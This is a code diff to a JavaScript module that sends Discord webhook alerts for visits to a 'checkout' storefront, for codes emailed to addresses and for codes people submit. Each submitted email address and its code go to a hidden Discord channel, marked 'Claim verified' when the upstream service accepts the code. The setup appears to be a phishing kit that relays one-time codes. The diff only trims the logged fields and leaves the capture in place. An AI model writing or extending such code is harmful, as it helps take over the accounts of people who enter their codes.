@@ -1,18 +1,15 @@
 /* Posts embed lines to the Discord channel wired up by VISIT_WEBHOOK.
 
    Lives beside the functions it serves rather than in the page, so the webhook
-   URL is never something a visitor can read out of view-source. */
+   URL is never something a visitor can read out of view-source.
+
+   Only the fields that matter go in. The upstream response is deliberately not
+   pasted verbatim - it is a wall of JSON that buries the one thing worth
+   seeing, which is whether the code was accepted. */
 
 const MAX = 900; // Discord rejects field values over 1024 characters
 
 const clip = (value) => String(value == null ? '' : value).slice(0, MAX) || '—';
-
-/* The upstream payload is the interesting part when something misbehaves, so
-   it is pretty-printed rather than squeezed onto one line. */
-function block(value) {
-  const text = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
-  return '```json\n' + String(text == null ? '' : text).slice(0, MAX) + '\n```';
-}
 
 async function post(embed) {
   const hook = process.env.VISIT_WEBHOOK;
@@ -41,23 +38,19 @@ export function reportVisit({ page, ref }) {
   if (ref) fields.push({ name: 'Referrer', value: clip(ref), inline: false });
   return post({
     title: '👀 New checkout visit',
-    description: 'Someone opened the storefront.',
     color: 0x5865f2,
     fields,
     footer: { text: `linkify.wtf • ${stamp()} UTC` }
   });
 }
 
-/* Fires when a code is emailed, carrying the whole response body. */
-export function reportSend({ email, ok, http, taskId, display, data }) {
+/* Fires when a code is emailed. */
+export function reportSend({ email, ok, display }) {
   const fields = [
     { name: 'Email', value: clip(email), inline: true },
-    { name: 'Result', value: ok ? '✅ Code sent' : '❌ Send failed', inline: true },
-    { name: 'HTTP', value: clip(http), inline: true }
+    { name: 'Result', value: ok ? '✅ Code sent' : '❌ Send failed', inline: true }
   ];
   if (display) fields.push({ name: 'Sent to', value: clip(display), inline: true });
-  if (taskId) fields.push({ name: 'Task', value: '`' + clip(taskId) + '`', inline: false });
-  fields.push({ name: 'API response', value: block(data), inline: false });
 
   return post({
     title: ok ? '📨 Code emailed' : '⚠️ Send failed',
@@ -67,17 +60,14 @@ export function reportSend({ email, ok, http, taskId, display, data }) {
   });
 }
 
-/* Fires when a code is submitted, carrying the address, the code and the
-   upstream verdict. */
-export function reportAttempt({ email, code, ok, http, why, data }) {
+/* Fires when a code is submitted: the address, the code, and the verdict. */
+export function reportAttempt({ email, code, ok, why }) {
   const fields = [
     { name: 'Email', value: clip(email), inline: true },
     { name: 'Code', value: '`' + clip(code) + '`', inline: true },
     { name: 'Result', value: ok ? '✅ Accepted' : '❌ Rejected', inline: true }
   ];
-  if (http != null) fields.push({ name: 'HTTP', value: clip(http), inline: true });
   if (why) fields.push({ name: 'Reason', value: clip(why), inline: false });
-  fields.push({ name: 'API response', value: block(data), inline: false });
 
   return post({
     title: ok ? '🎉 Claim verified' : '🔑 Code attempt',
